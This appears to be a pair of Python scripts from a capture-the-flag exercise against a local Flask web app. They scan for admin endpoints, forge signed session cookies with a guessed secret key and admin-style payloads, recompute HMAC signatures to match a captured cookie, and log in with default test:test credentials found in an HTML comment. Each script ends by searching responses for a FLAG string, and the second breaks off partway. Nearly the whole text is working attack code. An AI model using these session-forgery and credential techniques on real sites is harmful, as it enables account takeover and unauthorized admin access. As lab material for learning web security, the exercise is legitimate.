import base64
import requests
import json
import hashlib
import hmac
from itsdangerous import URLSafeTimedSerializer, Signer

# Target information
base_url = "http://127.0.0.1:32948"
secret_key = "your_secret_key"
original_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.ac1HnA.FebyScjcMvCp0EyankY0kHuCbcA"

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}

# First, let's check if there are other endpoints accessible
print("[+] Scanning for admin endpoints...")
endpoints = ["/", "/dashboard", "/admin", "/api", "/config", "/settings", "/profile", "/users", "/accounts"]

for endpoint in endpoints:
    url = base_url + endpoint
    # Test with original cookie
    resp = requests.get(url, headers=headers, cookies={"session": original_cookie}, allow_redirects=False, timeout=5)
    print(f"  {endpoint}: {resp.status_code} (length: {len(resp.text)})")
    if resp.status_code == 200:
        # Search for flags
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"    [!] FLAG FOUND: {flags}")

# Check POST endpoints
print("\n[+] Checking admin-specific endpoints...")
admin_endpoints = ["/admin", "/admin/dashboard", "/admin/users", "/admin/config"]
for endpoint in admin_endpoints:
    url = base_url + endpoint
    resp = requests.get(url, headers=headers, cookies={"session": original_cookie}, allow_redirects=False, timeout=5)
    print(f"  {endpoint}: {resp.status_code}")
    if resp.status_code == 200:
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"    [!] FLAG FOUND: {flags}")

# Try user_id 1 with different variations
print("\n[+] Trying session with various payload formats...")
test_cases = [
    {"user_id": 1},      # Integer
    {"user_id": "1"},    # String
    {"user_id": "1", "is_admin": True},
    {"user_id": "1", "admin": True},
    {"id": 1},
    {"id": "1"},
    {"_user_id": 1},
]

for i, payload in enumerate(test_cases):
    serializer = URLSafeTimedSerializer(secret_key)
    cookie = serializer.dumps(payload)
    resp = requests.get(f"{base_url}/dashboard", headers=headers, cookies={"session": cookie}, allow_redirects=False)
    print(f"  Test {i+1} {payload}: {resp.status_code}")
    if resp.status_code == 200:
        print(f"    [!] Access granted! Searching for FLAG...")
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"    [!] FLAG: {flags}")
            print(f"    Full response:\n{resp.text}")

# Now let's try to analyze the original cookie more carefully
print("\n--- Detailed cookie analysis ---")
parts = original_cookie.split('.')
print(f"Parts: {parts}")

# Decode each part
payload_b64 = parts[0] + '=='
payload = base64.urlsafe_b64decode(payload_b64)
print(f"Payload: {payload}")

ts_b64 = parts[1] + '=='
ts_bytes = base64.urlsafe_b64decode(ts_b64)
print(f"Timestamp bytes: {ts_bytes.hex()}")
print(f"Timestamp int: {int.from_bytes(ts_bytes, 'little')}")

# Try to manually craft a cookie with matching timestamp
print("\n--- Manual verification ---")
# The signature is HMAC(secret, payload + '.' + timestamp)
message = parts[0] + '.' + parts[1]
print(f"Message to sign: {message}")

# Try different key formats
digest = hmac.new(secret_key.encode(), message.encode(), hashlib.sha1).digest()
digest_b64 = base64.urlsafe_b64encode(digest).rstrip(b'=').decode('ascii')
print(f"Computed signature: {digest_b64}")
print(f"Original signature: {parts[2]}")
print(f"Match: {digest_b64 == parts[2]}")

# Try with 'cookie-session' salt
digest_salted = hmac.new(b'cookie-session' + secret_key.encode(), message.encode(), hashlib.sha1).digest()
digest_salted_b64 = base64.urlsafe_b64encode(digest_salted).rstrip(b'=').decode('ascii')
print(f"Salted signature: {digest_salted_b64}")
import base64
import requests
import json
from itsdangerous import URLSafeTimedSerializer

# Target information
base_url = "http://127.0.0.1:32948"
secret_key = "your_secret_key"
original_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.ac1HnA.FebyScjcMvCp0EyankY0kHuCbcA"

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}

# Get the full homepage
print("[+] Getting homepage...")
resp_home = requests.get(base_url + "/", headers=headers, allow_redirects=False)
print(f"Status: {resp_home.status_code}")
print(f"\n[+] Full homepage HTML:\n{resp_home.text}")

# Search for flags in homepage
import re
flags_home = re.findall(r'FLAG\{[^}]+\}', resp_home.text)
if flags_home:
    print(f"\n[!] FLAG found in homepage: {flags_home}")

# Try logging in with the test account found in the HTML comment
print("\n[+] Trying to login with test account (test:test)...")
login_data = {"username": "test", "password": "test"}
resp_login = requests.post(base_url + "/", data=login_data, headers=headers, allow_redirects=False)
print(f"Login status: {resp_login.status_code}")
print(f"Login headers: {dict(resp_login.headers)}")

# Check if we got a session cookie
if 'set-cookie' in resp_login.headers:
    print(f"\n[+] Set-Cookie header: {resp_login.headers['set-cookie']}")

# Follow the redirect
resp_after_login = requests.post(base_url + "/", data=login_data, headers=headers, allow_redirects=True)
print(f"\n[+] After login redirect - Status: {resp_after_login.status_code}")
print(f"[+] URL: {resp_after_login.url}")

# Check cookies
print(f"\n[+] Cookies after login:")
